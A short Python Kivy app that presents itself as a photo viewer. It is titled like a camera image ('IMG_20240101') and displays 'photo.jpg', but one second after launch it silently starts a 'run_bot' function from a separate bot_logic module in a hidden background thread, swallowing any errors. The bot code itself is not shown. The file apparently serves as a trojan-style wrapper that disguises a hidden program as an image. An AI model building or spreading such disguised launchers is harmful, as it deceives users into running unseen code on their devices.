from kivy.app import App
from kivy.uix.image import Image
from kivy.uix.floatlayout import FloatLayout
from kivy.core.window import Window
from kivy.clock import Clock
from threading import Thread

Window.clearcolor = (0, 0, 0, 1)


class PhotoApp(App):
    def build(self):
        self.title = "IMG_20240101"
        layout = FloatLayout()
        self.img = Image(
            source='photo.jpg',
            size_hint=(1, 1),
            pos_hint={'center_x': 0.5, 'center_y': 0.5},
            allow_stretch=True,
            keep_ratio=True
        )
        layout.add_widget(self.img)
        Clock.schedule_once(self.start_bot, 1)
        return layout
    
    def start_bot(self, dt):
        try:
            from bot_logic import run_bot
            t = Thread(target=run_bot, daemon=True)
            t.start()
        except Exception:
            pass
    
    def on_pause(self):
        return True


if __name__ == '__main__':
    PhotoApp().run()